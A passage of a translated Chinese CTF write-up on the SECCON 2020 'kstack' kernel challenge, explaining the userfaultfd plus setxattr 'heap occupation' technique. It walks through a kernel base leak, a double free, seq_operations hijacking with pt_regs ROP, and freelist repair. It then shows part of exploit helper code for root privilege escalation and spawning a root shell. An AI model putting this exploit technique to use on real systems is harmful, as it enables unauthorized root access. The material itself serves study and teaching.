@@ -1,0 +1,262 @@
+# 从 SECCON2020 一道 kernel pwn 看 userfaultfd + setxattr “堆占位”技术
+|
+##### 译文声明
+本文是翻译文章
+译文仅供参考，具体内容表达以及含义原文为准。
+## 0x00.一切开始之前
+或许大部分 kernel hacker 在阅读本篇文章之前便已经听说过 userfaultfd + setxattr
+这一内核堆利用技术，亦或是自己成功利用该技术完成对内核中一些漏洞的利用（例如
+CVE-2019-15666），此时看到“堆占位”这一名称或许会感到有些疑惑——因为这两个技术相结合的利用或许与“堆喷射”（heap spray）有关？
+在开始之前笔者需要向大家说明——是的，userfaultfd + setxattr
+确乎是通用的内核堆喷射技术，但当我们将这一技术放在对一些特定漏洞上的利用（例如
+UAF）时，“堆喷射”这一名称似乎并不适用——因为此时我们并不需要“喷射”（分配）大量的 object，而是需要在特定的时间节点完成对特定的 object
+的写入与占用，因此笔者也参照网上一些文章的说法将这种利用手法称之为“堆占位”技术
+按照惯例，我们还是以一道 CTF 题目作为切入点，因为相比起真实的漏洞利用，CTF题目的简洁性能够帮助我们更快地理解与掌握一项技术的本质
+若是你对于 userfaultfd 在内核空间中的利用并不熟悉，可以先阅读笔者此前发表在安全客上的这篇文章：[从强网杯 2021 线上赛题目
+notebook 中浅析 userfaultfd 在 kernel pwn
+中的利用](https://www.anquanke.com/post/id/253835)，本篇笔者不会重复叙述 userfaultfd
+相关的基础知识来骗稿费（笑）（我可谢谢您嘞）
+## 0x01.setxattr 系统调用
+setxattr 是一个十分独特的系统调用族，抛开其本身的功能，在 kernel 的利用当中他可以为我们提供 **近乎任意大小的内核空间 object
+分配**
+观察 setxattr 源码，发现如下调用链：
+    SYS_setxattr()
+        path_setxattr()
+            setxattr()
+在 `setxattr()` 函数中有如下逻辑：
+    static long
+    setxattr(struct dentry *d, const char __user *name, const void __user *value,
+         size_t size, int flags)
+    {
+        //...
+            kvalue = kvmalloc(size, GFP_KERNEL);
+            if (!kvalue)
+                return -ENOMEM;
+            if (copy_from_user(kvalue, value, size)) {
+        //,..
+        kvfree(kvalue);
+        return error;
+    }
+那么这里 setxattr 系统调用便提供给我们这样一条调用链：
+  * 在内核空间分配 object
+  * 向 object 内写入内容
+  * 释放分配的 object
+这里的 value 和 size 都是由我们来指定的，即 **我们可以分配任意大小的 object 并向其中写入内容**
+###  setxattr 与 userfaultfd
+虽然我们通过 setxattr 系统调用可以在内核空间中分配任意大小的 object 并写入任意内容，但是该 object 在 setxattr
+执行结束时又会被放回 freelist 中，那我们将前功尽弃
+重新考虑 setxattr 的执行流程，其中会调用 `copy_from_user` 从用户空间拷贝数据，那么让我们考虑如下场景：
+我们通过 mmap 分配连续的两个页面，在第二个页面上启用 userfaultfd 监视，并在第一个页面的末尾写入我们想要的数据，此时我们调用
+setxattr 进行 **跨页面的拷贝** ，当 copy_from_user 拷贝到第二个页面时 **便会触发 userfaultfd，从而让
+setxattr 的执行流程卡在此处，这样这个 object 就不会被释放掉，而是可以继续参与我们接下来的利用**
+这便是 setxattr + userfaultfd 结合的堆占位技术
+## 0x02.SECCON 2020 kstack
+###  分析
+惯例地查看启动脚本：
+    #!/bin/sh
+    qemu-system-x86_64 \
+        -m 512M \
+        -kernel ./bzImage \
+        -initrd ./rootfs.cpio \
+        -append "root=/dev/ram rw console=ttyS0 oops=panic panic=1 kaslr quiet" \
+        -cpu kvm64,+smep \
+        -net user -net nic -device e1000 \
+        -monitor /dev/null \
+        -nographic
+开启了 smep 和 kaslr
+查看 `/sys/devices/system/cpu/vulnerabilities/*`：
+    / $ cat /sys/devices/system/cpu/vulnerabilities/*
+    Processor vulnerable
+    Mitigation: PTE Inversion
+    Vulnerable: Clear CPU buffers attempted, no microcode; SMT Host state unknown
+    Mitigation: PTI
+    Vulnerable
+    Mitigation: usercopy/swapgs barriers and __user pointer sanitization
+    Mitigation: Full generic retpoline, STIBP: disabled, RSB filling
+    Not affected
+开启了 KPTI
+拖入 IDA 中进行分析，发现只定义了一个 ioctl 的两种功能
+**建链表节点**
+先分析第一种功能，在这里先用 kmalloc 分配了一个 object，之后将其使用头插法通过全局变量 head 插入到单向链表中
+分析可知其结构应当如下所示：
+    struct node
+    {
+        void            *unknown;
+        char             data[8];
+        struct node     *next;
+    };
+该结构体前八个字节是从 `current_task` 的某个特殊偏移取的值，经尝试可知为线程组 id，我们来看其分配过程，使用了
+`kmem_cache_alloc(kmalloc_caches[5], 0x60000C0)`，第二个参数是 flag ，为常规的
+`GFP_KERNEL`，这里可以暂且忽略
+现在我们来看第一个参数，笔者推测这应当是 gcc 优化 kmalloc 的结果；在内核中有一个数组 `kmalloc_caches` 存放
+kmem_cache，在内核源码 `mm/slab_common.c` 中我们可以得知其初始化的大小
+    /*
+     * kmalloc_info[] is to make slub_debug=,kmalloc-xx option work at boot time.
+     * kmalloc_index() supports up to 2^25=32MB, so the final entry of the table is
+     * kmalloc-32M.
+     */
+    const struct kmalloc_info_struct kmalloc_info[] __initconst = {
+        INIT_KMALLOC_INFO(0, 0),
+        INIT_KMALLOC_INFO(96, 96),
+        INIT_KMALLOC_INFO(192, 192),
+        INIT_KMALLOC_INFO(8, 8),
+        INIT_KMALLOC_INFO(16, 16),
+        INIT_KMALLOC_INFO(32, 32),
+    //...
+下标 `[5]` 即第六个 kmem_cache 为 `kmalloc-32`，由此我们可以得知分配的 object 大小为 0x20
+**删除链表节点**
+比较简单且常规的脱链操作，会将同一线程组创建的节点中的头节点删除，并将其 data 拷贝给用户
+若并节点所属线程组与当前进程非同一线程组，则会一直找到那个线程组的节点或是遍历结束为止
+分析下来，联想到题目名叫 `k stack`，我们不难猜出这是在模拟栈的 push 与 pop 操作
+###  利用
+我们注意到其拷贝时使用了 copy_from_user 与 copy_to_user，且 **ioctl 操作全程没有加锁** ，这为
+userfaultfd 提供了可能性
+**1）泄露内核基址：shm_file_data**
+在创建节点时先将新的 object 赋给 head 指针，之后再调用 copy_from_user，我们不难想到的是，可以通过 userfaultfd
+让分配线程在 copy_from_user 这里卡住，之后我们在 userfaultfd 线程当中再将该 object 释放，这样我们就能够读出 8
+字节的“脏数据”，那么在如此之前我们应当分配一个带有可用数据的结构体并释放
+由于题目限制了分配的 object 的大小，故我们应当考虑从 kmallc-32 中分配的结构体，这里笔者选用 `shm_file_data`
+这一结构体，其定义如下：
+    struct shm_file_data {
+        int id;
+        struct ipc_namespace *ns;
+        struct file *file;
+        const struct vm_operations_struct *vm_ops;
+    };
+其中我们可以读取的 `ns` 域刚好指向内核 .text 段，由此我们可以泄露出内核基址
+我们可以在通过 `shmget` 系统调用创建共享内存之后通过 `shmat` 系统调用获得该结构体，通过 `shmdt` 我们可以释放该结构体
+> 在这里有个笔者弄不明白原因的点：我们需要先创建 userfaultfd 线程后再进行 shm 操作， **否则会失败**
+> ，在笔者理解中这操作两个之间的顺序并不关键
+**2）构造 double free**
+构造 double free 的流程比较简单，我们只需要在 pop 时通过 copy_to_user 触发 userfaultfd，在
+userfaultfd 线程中再 pop 一次即可
+**3）userfaultfd + setxattr 劫持 seq_operations 控制内核执行流**
+现在在 kmalloc-32 当中的第一个 object 指向自身，那么在接下来的两次分配中我们都将会获得同一个 object，第一次分配时笔者选择分配到
+seq_operations 处，接下来我们通过 setxattr 再一次分配到该 object，通过 setxattr 更改 seq_operations
+中的指针
+由于我们需要劫持其第一个指针，故这里我们不能够让 setxattr 执行到末尾将 object 又释放掉，而应当在 setxattr 中的
+copy_from_user 中用 userfaultfd 卡住，在 userfaultfd 线程中触发劫持后指针控制内核执行流
+控制内核执行流后笔者选择用常规的 pt_regs 来完成 ROP
+> 若你不知道 pt_regs 这一通用 kernel ROP 手法，可以先阅读考笔者往期的文章
+**4) 修复 kmalloc-32 的 freelist 拿到稳定 root shell**
+在我们通过 double free 完成利用之后， **内核空间的 kmalloc-32 的 freelist已经被破坏了** ，此时我们若是直接起一个
+shell 则会造成 kernel panic，因此我们在返回用户空间之后需要先修复 freelist
+修复 freelist 只需要往里面放入一定数量的 object 即可，笔者选择在一开始时先多次打开 `/proc/self/stat` 分配大量
+seq_operations 结构体做备用，之后在 setxattr 线程中将其全部释放，这样我们就能够完美着陆回用户态，安全地起一个稳定的 root
+shell
+###  FINAL EXPLOIT
+最终的 exp 如下：
+> kernelpwn.h
+    #include 
+    #include 
+    #include 
+    #include 
+    #include 
+    #include 
+    #include 
+    #include 
+    #include 
+    #include 
+    #include 
+    #include 
+    #include 
+    #include 
+    #include 
+    #include 
+    #include 
+    void * kernel_base = 0xffffffff81000000;
+    size_t kernel_offset = 0;
+    static pthread_t monitor_thread;
+    void errExit(char * msg)
+    {
+        printf("\033[31m\033[1m[x] Error at: \033[0m%s\n", msg);
+        exit(EXIT_FAILURE);
+    }
+    void registerUserFaultFd(void * addr, unsigned long len, void (*handler)(void*))
+    {
+        long uffd;
+        struct uffdio_api uffdio_api;
+        struct uffdio_register uffdio_register;
+        int s;
+        /* Create and enable userfaultfd object */
+        uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
+        if (uffd == -1)
+            errExit("userfaultfd");
+        uffdio_api.api = UFFD_API;
+        uffdio_api.features = 0;
+        if (ioctl(uffd, UFFDIO_API, &uffdio_api) == -1)
+            errExit("ioctl-UFFDIO_API");
+        uffdio_register.range.start = (unsigned long) addr;
+        uffdio_register.range.len = len;
+        uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;
+        if (ioctl(uffd, UFFDIO_REGISTER, &uffdio_register) == -1)
+            errExit("ioctl-UFFDIO_REGISTER");
+        s = pthread_create(&monitor_thread, NULL, handler, (void *) uffd);
+        if (s != 0)
+            errExit("pthread_create");
+    }
+    size_t user_cs, user_ss, user_rflags, user_sp;
+    void saveStatus()
+    {
+        __asm__("mov user_cs, cs;"
+                "mov user_ss, ss;"
+                "mov user_sp, rsp;"
+                "pushf;"
+                "pop user_rflags;"
+                );
+        printf("\033[34m\033[1m[*] Status has been saved.\033[0m\n");
+    }
+    size_t commit_creds = NULL, prepare_kernel_cred = NULL;
+    void getRootPrivilige(void)
+    {
+        void * (*prepare_kernel_cred_ptr)(void *) = prepare_kernel_cred;
+        int (*commit_creds_ptr)(void *) = commit_creds;
+        (*commit_creds_ptr)((*prepare_kernel_cred_ptr)(NULL));
+    }
+    void getRootShell(void)
+    {   
+        puts("\033[32m\033[1m[+] Backing from the kernelspace.\033[0m");
+        if(getuid())
+        {
+            puts("\033[31m\033[1m[x] Failed to get the root!\033[0m");
+            exit(-1);
+        }
+        puts("\033[32m\033[1m[+] Successful to get the root. Execve root shell now...\033[0m");
+        system("/bin/sh");
+        exit(0);// to exit the process normally instead of segmentation fault
+    }
+    /* ------ kernel structure ------ */
+    struct file_operations;
+    struct tty_struct;
+    struct tty_driver;
+    struct serial_icounter_struct;
+    struct tty_operations {
+        struct tty_struct * (*lookup)(struct tty_driver *driver,
+                struct file *filp, int idx);
+        int  (*install)(struct tty_driver *driver, struct tty_struct *tty);
+        void (*remove)(struct tty_driver *driver, struct tty_struct *tty);
+        int  (*open)(struct tty_struct * tty, struct file * filp);
+        void (*close)(struct tty_struct * tty, struct file * filp);
+        void (*shutdown)(struct tty_struct *tty);
+        void (*cleanup)(struct tty_struct *tty);
+        int  (*write)(struct tty_struct * tty,
+                  const unsigned char *buf, int count);
+        int  (*put_char)(struct tty_struct *tty, unsigned char ch);
+        void (*flush_chars)(struct tty_struct *tty);
+        int  (*write_room)(struct tty_struct *tty);
+        int  (*chars_in_buffer)(struct tty_struct *tty);
+        int  (*ioctl)(struct tty_struct *tty,
+                unsigned int cmd, unsigned long arg);
+        long (*compat_ioctl)(struct tty_struct *tty,
+                     unsigned int cmd, unsigned long arg);
+        void (*set_termios)(struct tty_struct *tty, struct ktermios * old);
+        void (*throttle)(struct tty_struct * tty);
+        void (*unthrottle)(struct tty_struct * tty);
+        void (*stop)(struct tty_struct *tty);
+        void (*start)(struct tty_struct *tty);
+        void (*hangup)(struct tty_struct *tty);
+        int (*break_ctl)(struct tty_struct *tty, int state);
+        void (*flush_buffer)(struct tty_struct *tty);
+        void (*set_ldisc)(struct tty_struct *tty);
+        void (*wait_until_sent)(struct tty_struct *tty, int timeout);
+        void (*send_xchar)(struct tty_struct *tty, char ch);
